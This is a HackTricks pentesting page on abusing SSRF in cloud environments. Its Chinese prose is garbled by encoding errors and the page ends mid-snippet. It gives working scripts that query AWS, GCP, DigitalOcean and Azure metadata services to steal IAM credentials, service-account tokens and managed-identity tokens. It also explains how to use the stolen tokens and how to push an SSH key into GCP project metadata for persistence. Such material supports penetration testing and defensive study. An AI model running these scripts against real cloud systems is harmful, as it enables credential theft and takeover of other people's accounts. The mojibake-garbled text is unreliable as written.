# äº‘ç«¯SSRF

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ç«¯ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ æ¨ç‰¹ ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨ä¸€å®¶**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## AWS

### æ»¥ç”¨AWS EC2ç¯å¢ƒä¸­çš„SSRF

**å…ƒæ•°æ®**ç«¯ç‚¹å¯ä»¥ä»ä»»ä½•EC2æœºå™¨å†…éƒ¨è®¿é—®ï¼Œå¹¶æä¾›æœ‰å…³è¯¥æœºå™¨çš„æœ‰è¶£ä¿¡æ¯ã€‚å®ƒå¯ä»¥é€šè¿‡ä»¥ä¸‹URLè®¿é—®ï¼š`http://169.254.169.254`ï¼ˆ[æœ‰å…³å…ƒæ•°æ®çš„ä¿¡æ¯åœ¨æ­¤å¤„](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html)ï¼‰ã€‚

å…ƒæ•°æ®ç«¯ç‚¹æœ‰**2ä¸ªç‰ˆæœ¬**ã€‚**ç¬¬ä¸€ä¸ª**ç‰ˆæœ¬å…è®¸é€šè¿‡**GET**è¯·æ±‚è®¿é—®ç«¯ç‚¹ï¼ˆå› æ­¤ä»»ä½•**SSRFéƒ½å¯ä»¥åˆ©ç”¨**å®ƒï¼‰ã€‚å¯¹äº**ç¬¬äºŒä¸ªç‰ˆæœ¬**ï¼Œ[IMDSv2](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html)ï¼Œæ‚¨éœ€è¦å‘é€ä¸€ä¸ªå¸¦æœ‰**HTTPå¤´**çš„**PUT**è¯·æ±‚æ¥è¯·æ±‚ä¸€ä¸ª**ä»¤ç‰Œ**ï¼Œç„¶åä½¿ç”¨è¯¥ä»¤ç‰Œæ¥é€šè¿‡å¦ä¸€ä¸ªHTTPå¤´è®¿é—®å…ƒæ•°æ®ï¼ˆå› æ­¤ä½¿ç”¨SSRFæ»¥ç”¨**æ›´åŠ å¤æ‚**ï¼‰ã€‚

åœ¨**ç¬¬äºŒä¸ªç‰ˆæœ¬**ä¸­ï¼Œ**PUTè¯·æ±‚çš„TTLé»˜è®¤ä¸º1**ã€‚è¿™ç¡®ä¿äº†é…ç½®é”™è¯¯çš„ç½‘ç»œè®¾å¤‡ï¼ˆé˜²ç«å¢™ã€NATè®¾å¤‡ã€è·¯ç”±å™¨ç­‰ï¼‰ä¸ä¼šè½¬å‘è¯¥æ•°æ®åŒ…ã€‚è¿™ä¹Ÿæ„å‘³ç€ä½¿ç”¨é»˜è®¤ç½‘ç»œé…ç½®ï¼ˆæ¡¥æ¥æ¨¡å¼ï¼‰çš„**Dockerå®¹å™¨**å°†æ— æ³•è®¿é—®å®ä¾‹å…ƒæ•°æ®æœåŠ¡ã€‚\
**IMDSv2**è¿˜å°†**é˜»æ­¢åŒ…å«`X-Forwarded-For`å¤´çš„è¯·æ±‚æ¥è·å–ä»¤ç‰Œ**ã€‚è¿™æ˜¯ä¸ºäº†é˜²æ­¢é…ç½®é”™è¯¯çš„åå‘ä»£ç†èƒ½å¤Ÿè®¿é—®å®ƒã€‚

æ‚¨å¯ä»¥åœ¨æ–‡æ¡£ä¸­æ‰¾åˆ°æœ‰å…³[å…ƒæ•°æ®ç«¯ç‚¹çš„ä¿¡æ¯](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-categories.html)ã€‚ä»¥ä¸‹è„šæœ¬ä»ä¸­è·å–äº†ä¸€äº›æœ‰è¶£çš„ä¿¡æ¯ï¼š
```bash
EC2_TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null || wget -q -O - --method PUT "http://169.254.169.254/latest/api/token" --header "X-aws-ec2-metadata-token-ttl-seconds: 21600" 2>/dev/null)
HEADER="X-aws-ec2-metadata-token: $EC2_TOKEN"
URL="http://169.254.169.254/latest/meta-data"

aws_req=""
if [ "$(command -v curl)" ]; then
aws_req="curl -s -f -H '$HEADER'"
elif [ "$(command -v wget)" ]; then
aws_req="wget -q -O - -H '$HEADER'"
else
echo "Neither curl nor wget were found, I can't enumerate the metadata service :("
fi

printf "ami-id: "; eval $aws_req "$URL/ami-id"; echo ""
printf "instance-action: "; eval $aws_req "$URL/instance-action"; echo ""
printf "instance-id: "; eval $aws_req "$URL/instance-id"; echo ""
printf "instance-life-cycle: "; eval $aws_req "$URL/instance-life-cycle"; echo ""
printf "instance-type: "; eval $aws_req "$URL/instance-type"; echo ""
printf "region: "; eval $aws_req "$URL/placement/region"; echo ""

echo ""
echo "Account Info"
eval $aws_req "$URL/identity-credentials/ec2/info"; echo ""
eval $aws_req "http://169.254.169.254/latest/dynamic/instance-identity/document"; echo ""

echo ""
echo "Network Info"
for mac in $(eval $aws_req "$URL/network/interfaces/macs/" 2>/dev/null); do
echo "Mac: $mac"
printf "Owner ID: "; eval $aws_req "$URL/network/interfaces/macs/$mac/owner-id"; echo ""
printf "Public Hostname: "; eval $aws_req "$URL/network/interfaces/macs/$mac/public-hostname"; echo ""
printf "Security Groups: "; eval $aws_req "$URL/network/interfaces/macs/$mac/security-groups"; echo ""
echo "Private IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv4-associations/"; echo ""
printf "Subnet IPv4: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv4-cidr-block"; echo ""
echo "PrivateIPv6s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/ipv6s"; echo ""
printf "Subnet IPv6: "; eval $aws_req "$URL/network/interfaces/macs/$mac/subnet-ipv6-cidr-blocks"; echo ""
echo "Public IPv4s:"; eval $aws_req "$URL/network/interfaces/macs/$mac/public-ipv4s"; echo ""
echo ""
done

echo ""
echo "IAM Role"
eval $aws_req "$URL/iam/info"
for role in $(eval $aws_req "$URL/iam/security-credentials/" 2>/dev/null); do
echo "Role: $role"
eval $aws_req "$URL/iam/security-credentials/$role"; echo ""
echo ""
done

echo ""
echo "User Data"
# Search hardcoded credentials
eval $aws_req "http://169.254.169.254/latest/user-data"

echo ""
echo "EC2 Security Credentials"
eval $aws_req "$URL/identity-credentials/ec2/security-credentials/ec2-instance"; echo ""
```
ä½œä¸ºå…¬å¼€å¯ç”¨çš„IAMå‡­è¯æš´éœ²çš„ç¤ºä¾‹ï¼Œæ‚¨å¯ä»¥è®¿é—®ï¼š[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/iam/security-credentials/flaws)

æ‚¨è¿˜å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ£€æŸ¥å…¬å¼€çš„EC2å®‰å…¨å‡­è¯ï¼š[http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance](http://4d0cf09b9b2d761a7d87be99d17507bce8b86f3b.flaws.cloud/proxy/169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance)

ç„¶åï¼Œæ‚¨å¯ä»¥ä½¿ç”¨è¿™äº›å‡­è¯ä¸AWS CLIä¸€èµ·ä½¿ç”¨ã€‚è¿™å°†å…è®¸æ‚¨æ‰§è¡Œè¯¥è§’è‰²å…·æœ‰æƒé™æ‰§è¡Œçš„**ä»»ä½•æ“ä½œ**ã€‚

è¦åˆ©ç”¨æ–°å‡­è¯ï¼Œæ‚¨éœ€è¦åˆ›å»ºä¸€ä¸ªæ–°çš„AWSé…ç½®æ–‡ä»¶ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š
```
[profilename]
aws_access_key_id = ASIA6GG7PSQG4TCGYYOU
aws_secret_access_key = a5kssI2I4H/atUZOwBr5Vpggd9CxiT5pUkyPJsjC
aws_session_token = AgoJb3JpZ2luX2VjEGcaCXVzLXdlc3QtMiJHMEUCIHgCnKJl8fwc+0iaa6n4FsgtWaIikf5mSSoMIWsUGMb1AiEAlOiY0zQ31XapsIjJwgEXhBIW3u/XOfZJTrvdNe4rbFwq2gMIYBAAGgw5NzU0MjYyNjIwMjkiDCvj4qbZSIiiBUtrIiq3A8IfXmTcebRDxJ9BGjNwLbOYDlbQYXBIegzliUez3P/fQxD3qDr+SNFg9w6WkgmDZtjei6YzOc/a9TWgIzCPQAWkn6BlXufS+zm4aVtcgvBKyu4F432AuT4Wuq7zrRc+42m3Z9InIM0BuJtzLkzzbBPfZAz81eSXumPdid6G/4v+o/VxI3OrayZVT2+fB34cKujEOnBwgEd6xUGUcFWb52+jlIbs8RzVIK/xHVoZvYpY6KlmLOakx/mOyz1tb0Z204NZPJ7rj9mHk+cX/G0BnYGIf8ZA2pyBdQyVbb1EzV0U+IPlI+nkIgYCrwTCXUOYbm66lj90frIYG0x2qI7HtaKKbRM5pcGkiYkUAUvA3LpUW6LVn365h0uIbYbVJqSAtjxUN9o0hbQD/W9Y6ZM0WoLSQhYt4jzZiWi00owZJjKHbBaQV6RFwn5mCD+OybS8Y1dn2lqqJgY2U78sONvhfewiohPNouW9IQ7nPln3G/dkucQARa/eM/AC1zxLu5nt7QY8R2x9FzmKYGLh6sBoNO1HXGzSQlDdQE17clcP+hrP/m49MW3nq/A7WHIczuzpn4zv3KICLPIw2uSc7QU6tAEln14bV0oHtHxqC6LBnfhx8yaD9C71j8XbDrfXOEwdOy2hdK0M/AJ3CVe/mtxf96Z6UpqVLPrsLrb1TYTEWCH7yleN0i9koRQDRnjntvRuLmH2ERWLtJFgRU2MWqDNCf2QHWn+j9tYNKQVVwHs3i8paEPyB45MLdFKJg6Ir+Xzl2ojb6qLGirjw8gPufeCM19VbpeLPliYeKsrkrnXWO0o9aImv8cvIzQ8aS1ihqOtkedkAsw=
```
è¯·æ³¨æ„**aws\_session\_token**ï¼Œè¿™å¯¹äºé…ç½®æ–‡ä»¶çš„å·¥ä½œæ˜¯å¿…ä¸å¯å°‘çš„ã€‚

å¯ä»¥ä½¿ç”¨[**PACU**](https://github.com/RhinoSecurityLabs/pacu)ä¸å‘ç°çš„å‡­æ®ä¸€èµ·ä½¿ç”¨ï¼Œä»¥äº†è§£æ‚¨çš„æƒé™å¹¶å°è¯•æå‡æƒé™ã€‚

### AWS ECSï¼ˆå®¹å™¨æœåŠ¡ï¼‰å‡­æ®ä¸­çš„SSRF

**ECS**æ˜¯ä¸€ç»„é€»è¾‘ä¸Šçš„EC2å®ä¾‹ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­è¿è¡Œåº”ç”¨ç¨‹åºï¼Œè€Œæ— éœ€æ‰©å±•è‡ªå·±çš„é›†ç¾¤ç®¡ç†åŸºç¡€è®¾æ–½ï¼Œå› ä¸ºECSä¼šä¸ºæ‚¨ç®¡ç†ã€‚å¦‚æœæ‚¨æˆåŠŸå…¥ä¾µè¿è¡Œåœ¨**ECS**ä¸­çš„æœåŠ¡ï¼Œåˆ™**å…ƒæ•°æ®ç«¯ç‚¹ä¼šå‘ç”Ÿå˜åŒ–**ã€‚

å¦‚æœæ‚¨è®¿é—®_**http://169.254.170.2/v2/credentials/\<GUID>**_ï¼Œæ‚¨å°†æ‰¾åˆ°ECSæœºå™¨çš„å‡­æ®ã€‚ä½†é¦–å…ˆï¼Œæ‚¨éœ€è¦**æ‰¾åˆ°\<GUID>**ã€‚è¦æ‰¾åˆ°\<GUID>ï¼Œæ‚¨éœ€è¦è¯»å–æœºå™¨å†…çš„**environ**å˜é‡**AWS\_CONTAINER\_CREDENTIALS\_RELATIVE\_URI**ã€‚\
æ‚¨å¯ä»¥åˆ©ç”¨**è·¯å¾„éå†**æ¼æ´è¯»å–å®ƒï¼Œä¾‹å¦‚`file:///proc/self/environ`\
ä¸Šè¿°çš„httpåœ°å€åº”è¯¥ç»™æ‚¨æä¾›**AccessKeyã€SecretKeyå’Œtoken**ã€‚
```bash
curl "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" 2>/dev/null || wget "http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI" -O -
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œåœ¨**æŸäº›æƒ…å†µä¸‹**ï¼Œæ‚¨å°†èƒ½å¤Ÿä»å®¹å™¨ä¸­è®¿é—®**EC2å…ƒæ•°æ®å®ä¾‹**ï¼ˆè¯·æ£€æŸ¥å‰é¢æåˆ°çš„IMDSv2 TTLé™åˆ¶ï¼‰ã€‚åœ¨è¿™äº›æƒ…å†µä¸‹ï¼Œæ‚¨å¯ä»¥ä»å®¹å™¨ä¸­è®¿é—®å®¹å™¨IAMè§’è‰²å’ŒEC2 IAMè§’è‰²ã€‚
{% endhint %}

### ç”¨äºAWS Lambdaçš„SSRF <a href="#6f97" id="6f97"></a>

åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œ**å‡­æ®å­˜å‚¨åœ¨ç¯å¢ƒå˜é‡ä¸­**ã€‚å› æ­¤ï¼Œè¦è®¿é—®å®ƒä»¬ï¼Œæ‚¨éœ€è¦è®¿é—®ç±»ä¼¼äº**`file:///proc/self/environ`**çš„å†…å®¹ã€‚

**æœ‰è¶£çš„ç¯å¢ƒå˜é‡çš„åç§°**æ˜¯ï¼š

* `AWS_SESSION_TOKEN`
* `AWS_SECRET_ACCESS_KEY`
* `AWS_ACCES_KEY_ID`

æ­¤å¤–ï¼Œé™¤äº†IAMå‡­æ®ä¹‹å¤–ï¼ŒLambdaå‡½æ•°è¿˜å…·æœ‰åœ¨å¯åŠ¨å‡½æ•°æ—¶ä¼ é€’ç»™å‡½æ•°çš„**äº‹ä»¶æ•°æ®**ã€‚é€šè¿‡[è¿è¡Œæ—¶æ¥å£](https://docs.aws.amazon.com/lambda/latest/dg/runtimes-api.html)ï¼Œè¯¥æ•°æ®å¯ä¾›å‡½æ•°ä½¿ç”¨ï¼Œå¹¶ä¸”å¯èƒ½åŒ…å«**æ•æ„Ÿä¿¡æ¯**ï¼ˆä¾‹å¦‚åœ¨**stageVariables**ä¸­ï¼‰ã€‚ä¸IAMå‡­æ®ä¸åŒï¼Œæ­¤æ•°æ®å¯ä»¥é€šè¿‡æ ‡å‡†SSRFåœ¨**`http://localhost:9001/2018-06-01/runtime/invocation/next`**ä¸Šè®¿é—®ã€‚

{% hint style="warning" %}
è¯·æ³¨æ„ï¼Œ**lambdaå‡­æ®**ä½äº**ç¯å¢ƒå˜é‡**ä¸­ã€‚å› æ­¤ï¼Œå¦‚æœlambdaä»£ç çš„å †æ ˆè·Ÿè¸ªæ‰“å°ç¯å¢ƒå˜é‡ï¼Œé€šè¿‡åœ¨åº”ç”¨ç¨‹åºä¸­å¼•å‘é”™è¯¯ï¼Œå¯ä»¥**æ³„éœ²å®ƒä»¬**ã€‚
{% endhint %}

### ç”¨äºAWS Elastic Beanstalkçš„SSRF URL <a href="#6f97" id="6f97"></a>

æˆ‘ä»¬ä»APIä¸­æ£€ç´¢`accountId`å’Œ`region`ã€‚
```
http://169.254.169.254/latest/dynamic/instance-identity/document
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
æˆ‘ä»¬ä»APIä¸­è·å–`AccessKeyId`ã€`SecretAccessKey`å’Œ`Token`ã€‚
```
http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-elasticbeanorastalk-ec2-role
```
![](https://miro.medium.com/max/60/0\*4OG-tRUNhpBK96cL?q=20) ![](https://miro.medium.com/max/1469/0\*4OG-tRUNhpBK96cL)

ç„¶åæˆ‘ä»¬ä½¿ç”¨ `aws s3 ls s3://elasticbeanstalk-us-east-2-[ACCOUNT_ID]/` å‘½ä»¤æ¥ä½¿ç”¨è¿™äº›å‡­æ®ã€‚

## GCP <a href="#6440" id="6440"></a>

æ‚¨å¯ä»¥åœ¨[**æ­¤å¤„æ‰¾åˆ°æœ‰å…³å…ƒæ•°æ®ç«¯ç‚¹çš„æ–‡æ¡£**](https://cloud.google.com/appengine/docs/standard/java/accessing-instance-metadata)ã€‚

### Google Cloud çš„ SSRF URL <a href="#6440" id="6440"></a>

éœ€è¦ä½¿ç”¨å¤´éƒ¨ "Metadata-Flavor: Google" æˆ– "X-Google-Metadata-Request: True"ï¼Œæ‚¨å¯ä»¥é€šè¿‡ä»¥ä¸‹URLè®¿é—®å…ƒæ•°æ®ç«¯ç‚¹ï¼š

* http://169.254.169.254
* http://metadata.google.internal
* http://metadata

æå–ä¿¡æ¯çš„æœ‰è¶£ç«¯ç‚¹ï¼š
```bash
# /project
# Project name and number
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/project-id
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/project/numeric-project-id
# Project attributes
curl -H "X-Google-Metadata-Request: True" http://metadata/computeMetadata/v1/project/attributes/?recursive=true

# /oslogin
# users
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/users
# groups
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/groups
# security-keys
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/security-keys
# authorize
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/oslogin/authorize

# /instance
# Description
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/description
# Hostname
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/hostname
# ID
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/id
# Image
curl -H "Metadata-Flavor:Google" http://metadata/computeMetadata/v1/instance/image
# Machine Type
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/machine-type
# Name
curl -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/name
# Tags
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/scheduling/tags
# Zone
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/zone
# User data
curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/attributes/startup-script"
# Network Interfaces
for iface in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/"); do
echo "  IP: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/ip")
echo "  Subnetmask: "$(curl -s -f -H "X-Google-Metadata-Request: True" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/subnetmask")
echo "  Gateway: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/gateway")
echo "  DNS: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/dns-servers")
echo "  Network: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/network-interfaces/$iface/network")
echo "  ==============  "
done
# Service Accounts
for sa in $(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/"); do
echo "  Name: $sa"
echo "  Email: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}email")
echo "  Aliases: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}aliases")
echo "  Identity: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}identity")
echo "  Scopes: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}scopes")
echo "  Token: "$(curl -s -f -H "Metadata-Flavor: Google" "http://metadata/computeMetadata/v1/instance/service-accounts/${sa}token")
echo "  ==============  "
done
# K8s Attributtes
## Cluster location
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-location
## Cluster name
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/cluster-name
## Os-login enabled
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/enable-oslogin
## Kube-env
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-env
## Kube-labels
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kube-labels
## Kubeconfig
curl -s -f -H "Metadata-Flavor: Google" http://metadata/computeMetadata/v1/instance/attributes/kubeconfig

# All custom project attributes
curl "http://metadata.google.internal/computeMetadata/v1/project/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"

# All custom project attributes instance attributes
curl "http://metadata.google.internal/computeMetadata/v1/instance/attributes/?recursive=true&alt=text" \
-H "Metadata-Flavor: Google"
```
Betaç›®å‰ä¸éœ€è¦å¤´éƒ¨ï¼ˆæ„Ÿè°¢Mathias Karlsson @avlidienbrunnï¼‰
```
http://metadata.google.internal/computeMetadata/v1beta1/
http://metadata.google.internal/computeMetadata/v1beta1/?recursive=true
```
{% hint style="danger" %}
ä¸ºäº†ä½¿ç”¨è¢«æ³„éœ²çš„æœåŠ¡è´¦å·ä»¤ç‰Œï¼Œä½ åªéœ€è¦æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š
```bash
# Via env vars
export CLOUDSDK_AUTH_ACCESS_TOKEN=<token>
gcloud projects list

# Via setup
echo "<token>" > /some/path/to/token
gcloud config set auth/access_token_file /some/path/to/token
gcloud projects list
gcloud config unset auth/access_token_file
```
{% endhint %}

### æ·»åŠ ä¸€ä¸ªSSHå¯†é’¥ <a href="#3e24" id="3e24"></a>

æå–ä»¤ç‰Œ
```
http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
```
æ£€æŸ¥ä»¤ç‰Œçš„èŒƒå›´
```
$ curl https://www.googleapis.com/oauth2/v1/tokeninfo?access_token=ya29.XXXXXKuXXXXXXXkGT0rJSA  {
"issued_to": "101302079XXXXX",
"audience": "10130207XXXXX",
"scope": "https://www.googleapis.com/auth/compute https://www.googleapis.com/auth/logging.write https://www.googleapis.com/auth/devstorage.read_write https://www.googleapis.com/auth/monitoring",
"expires_in": 2443,
"access_type": "offline"
}
```
ç°åœ¨æ¨é€SSHå¯†é’¥ã€‚

{% code overflow="wrap" %}
```bash
curl -X POST "https://www.googleapis.com/compute/v1/projects/1042377752888/setCommonInstanceMetadata"
-H "Authorization: Bearer ya29.c.EmKeBq9XI09_1HK1XXXXXXXXT0rJSA"
-H "Content-Type: application/json"
--data '{"items": [{"key": "sshkeyname", "value": "sshkeyvalue"}]}'
```
{% endcode %}

## Digital Ocean <a href="#9f1f" id="9f1f"></a>

{% hint style="warning" %}
Digital Oceanæ²¡æœ‰åƒAWSè§’è‰²æˆ–GCPæœåŠ¡è´¦æˆ·è¿™æ ·çš„ä¸œè¥¿ï¼Œæ‰€ä»¥ä¸è¦æœŸæœ›æ‰¾åˆ°å…ƒæ•°æ®æœºå™¨äººå‡­æ®
{% endhint %}

æ–‡æ¡£å¯åœ¨[`https://developers.digitalocean.com/documentation/metadata/`](https://developers.digitalocean.com/documentation/metadata/)æ‰¾åˆ°ã€‚
```
curl http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1.json
http://169.254.169.254/metadata/v1/
http://169.254.169.254/metadata/v1/id
http://169.254.169.254/metadata/v1/user-data
http://169.254.169.254/metadata/v1/hostname
http://169.254.169.254/metadata/v1/region
http://169.254.169.254/metadata/v1/interfaces/public/0/ipv6/addressAll in one request:
curl http://169.254.169.254/metadata/v1.json | jq
```
## Azure <a href="#cea8" id="cea8"></a>

### Azureè™šæ‹Ÿæœº

[**æ–‡æ¡£**åœ¨è¿™é‡Œ](https://learn.microsoft.com/zh-cn/azure/virtual-machines/windows/instance-metadata-service?tabs=linux)ã€‚

* **å¿…é¡»**åŒ…å«å¤´éƒ¨ `Metadata: true`
* **ä¸èƒ½**åŒ…å« `X-Forwarded-For` å¤´éƒ¨

{% tabs %}
{% tab title="Bash" %}
{% code overflow="wrap" %}
```bash
HEADER="Metadata:true"
URL="http://169.254.169.254/metadata"
API_VERSION="2021-12-13" #https://learn.microsoft.com/en-us/azure/virtual-machines/instance-metadata-service?tabs=linux#supported-api-versions

echo "Instance details"
curl -s -f -H "$HEADER" "$URL/instance?api-version=$API_VERSION"

echo "Load Balancer details"
curl -s -f -H "$HEADER" "$URL/loadbalancer?api-version=$API_VERSION"

echo "Management Token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://management.azure.com/"

echo "Graph token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://graph.microsoft.com/"

echo "Vault token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://vault.azure.net/"

echo "Storage token"
curl -s -f -H "$HEADER" "$URL/identity/oauth2/token?api-version=$API_VERSION&resource=https://storage.azure.com/"
```
{% endcode %}
{% endtab %}

{% tab title="PS" %}
```bash
# Powershell
Invoke-RestMethod -Headers @{"Metadata"="true"} -Method GET -NoProxy -Uri "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | ConvertTo-Json -Depth 64
## User data
$userData = Invoke- RestMethod -Headers @{"Metadata"="true"} -Method GET -Uri "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021- 01-01&format=text"
[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($userData))

# Paths
/metadata/instance?api-version=2017-04-02
/metadata/instance/network/interface/0/ipv4/ipAddress/0/publicIpAddress?api-version=2017-04-02&format=text
/metadata/instance/compute/userData?api-version=2021-01-01&format=text
```
{% endtab %}
{% endtabs %}

### Azure App Service

ä» **env** ä¸­å¯ä»¥è·å– `IDENTITY_HEADER` å’Œ `IDENTITY_ENDPOINT` çš„å€¼ã€‚ä½ å¯ä»¥ä½¿ç”¨è¿™äº›å€¼æ¥è·å–ä¸å…ƒæ•°æ®æœåŠ¡å™¨é€šä¿¡çš„ä»¤ç‰Œã€‚

å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œä½ éœ€è¦ä¸€ä¸ªç”¨äºä»¥ä¸‹èµ„æºçš„ä»¤ç‰Œï¼š

* [https://storage.azure.com](https://storage.azure.com/)
* [https://vault.azure.net](https://vault.azure.net/)
* [https://graph.microsoft.com](https://graph.microsoft.com/)
* [https://management.azure.com](https://management.azure.com/)
```bash
# Check for those env vars to know if you are in an Azure app
echo $IDENTITY_HEADER
echo $IDENTITY_ENDPOINT

# You should also be able to find the folder:
ls /opt/microsoft
#and the file
ls /opt/microsoft/msodbcsql17

# Get management token
curl "$IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER
# Get graph token
curl "$IDENTITY_ENDPOINT?resource=https://graph.azure.com/&api-version=2017-09-01" -H secret:$IDENTITY_HEADER

# API
# Get Subscriptions
URL="https://management.azure.com/subscriptions?api-version=2020-01-01"
curl -H "Authorization: $TOKEN" "$URL"
# Get current permission on resources in the subscription
URL="https://management.azure.com/subscriptions/<subscription-uid>/resources?api-version=2020-10-01'"
curl -H "Authorization: $TOKEN" "$URL"
# Get permissions in a VM
URL="https://management.azure.com/subscriptions/<subscription-uid>/resourceGroups/Engineering/providers/Microsoft.Compute/virtualMachines/<VM-name>/providers/Microsoft.Authorization/permissions?api-version=2015-07-01"
curl -H "Authorization: $TOKEN" "$URL"
```

```powershell
# API request in powershell to management endpoint
$Token = 'eyJ0eX..'
